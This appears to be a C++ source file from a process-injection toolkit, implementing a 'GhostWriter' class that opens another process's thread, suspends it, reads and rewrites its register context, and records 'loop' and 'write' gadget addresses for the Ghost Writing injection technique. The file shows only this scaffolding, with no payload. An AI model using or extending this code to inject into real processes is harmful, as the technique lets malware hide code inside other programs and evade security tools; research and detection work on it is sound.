#include <iostream>
#include "GhostWritingInjection.h"
#include "../Common/Utils.h"

GhostWriter::GhostWriter(DWORD threadID, bool is32Bits)
{
    this->threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadID);
    if (!this->threadHandle)
    {
        ThrowException(std::string("GhostWriter: OpenThread error ") + std::to_string(GetLastError()));
    }
    this->is32Bits = is32Bits;

    // save thread context to restore later
    // TODO: remove. original context must be read when we call the gadgets for the first time.
    this->SuspendThread();
    if (is32Bits)
    {
        this->originalContext = std::make_unique<BYTE[]>(sizeof(WOW64_CONTEXT));
        Wow64GetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(this->originalContext.get()));
    }
    else
    {
        this->originalContext = std::make_unique<BYTE[]>(sizeof(CONTEXT));
        GetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(this->originalContext.get()));
    }
    this->ResumeThread();
}

bool GhostWriter::SuspendThread()
{
    if (::SuspendThread(this->threadHandle) > -1)
    {
        return true;
    }
    std::cerr << "SuspendThread error " << GetLastError();
    return false;
}

bool GhostWriter::ResumeThread()
{
    if (::ResumeThread(this->threadHandle) > -1)
    {
        return true;
    }
    std::cerr << "ResumeThread error " << GetLastError();
    return false;
}

void GhostWriter::SetLoopGadget(BYTE* address)
{
    this->loopGadgetAddr = address;
}

void GhostWriter::SetWriteGadget(BYTE* address)
{
    this->writeGadgetAddr = address;
}

void GhostWriter::GetContext(void* context)
{
    this->SuspendThread();
    if (this->is32Bits)
    {
        Wow64GetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(context));
    }
    else
    {
        GetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(context));
    }
    this->ResumeThread();
}

void GhostWriter::SetContext(void* context)
{
    this->SuspendThread();
    if (this->is32Bits)
    {
        Wow64SetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(context));
    }
    else
    {
        SetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(context));
    }
    this->ResumeThread();
}